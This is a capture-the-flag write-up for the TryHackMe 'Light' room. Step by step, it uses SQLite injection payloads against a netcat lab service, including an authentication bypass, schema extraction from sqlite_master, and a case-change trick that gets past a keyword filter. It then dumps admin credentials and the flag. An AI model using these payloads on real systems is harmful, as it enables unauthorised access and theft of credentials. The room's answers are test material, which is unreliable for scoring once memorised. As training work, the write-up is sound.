# Light - CTF

## Target Information
- **IP Address**: `10.10.15.185`
- **Connection Command:**
```bash
nc 10.10.15.185 1337
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc 10.10.15.185 1337
Welcome to the Light database!
Please enter your username:
```

## Credentials
- **Username**: smokey

---

## Enumeration

Upon connecting to the service, I try input a username that's giving:

```bash
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

### SQL Injection Testing
I attempted common SQL injection techniques. The input `' or '1'='1` successfully bypassed authentication and provided a different password:

```bash
Please enter your username: ' or '1'='1
Password: tF8tj2o94WE4LKC
```

Testing with a single quote (`'`) triggered an error message:

```bash
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

This error suggested the backend was using SQLite. Searching online, I found a StackOverflow post confirming this error is SQLite-related. This led me to reference SQLite-specific injection techniques from the [PayloadsAllTheThings SQLite Injection guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md).

### Extracting Database Structure
Since SQLite supports querying database metadata via `sqlite_master`, I attempted to list database tables using:

```bash
Please enter your username: ' UNION SELECT sql FROM sqlite_master '
```

However, a filter was in place:

```bash
Ahh there is a word in there I don't like :(
```

I tested if the filter was case-sensitive:

```bash
Please enter your username: union
Ahh there is a word in there I don't like :(
```

However, using a capitalized version bypassed the filter:

```bash
Please enter your username: Union
Username not found.
```

The same worked for `SELECT`:

```bash
Please enter your username: select
Ahh there is a word in there I don't like :(
```
```bash
Please enter your username: Select
Username not found.
```

Using this technique, I successfully retrieved the database structure:

```bash
Please enter your username: ' Union Select sql FROM sqlite_master '
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

This revealed a table named `admintable` with columns `id`, `username`, and `password`.

### Extracting Admin Credentials
To retrieve the admin username, I queried `id=1`:

```bash
Please enter your username: ' Union Select username FROM admintable WHERE id=1 or '
Password: TryHackMeAdmin
```

#### Answer to Question 1:
**What is the admin username?:** `TryHackMeAdmin`

Next, I extracted the admin password:

```bash
Please enter your username: ' Union Select password FROM admintable WHERE id=1 or '
Password: mamZtAuMlrsEy5bp6q17
```

#### Answer to Question 2:
**What is the password to the username mentioned in question 1?:** `mamZtAuMlrsEy5bp6q17`

### Extracting the Flag
To check for additional users, I queried `id=2`:

```bash
Please enter your username: ' Union Select username FROM admintable WHERE id=2 or '       
Password: flag
```

Since this was likely the flag, I retrieved the corresponding password:

```bash
Please enter your username: ' Union Select password FROM admintable WHERE id=2 or '
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

#### Answer to Question 3:
**What is the flag?:** `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`
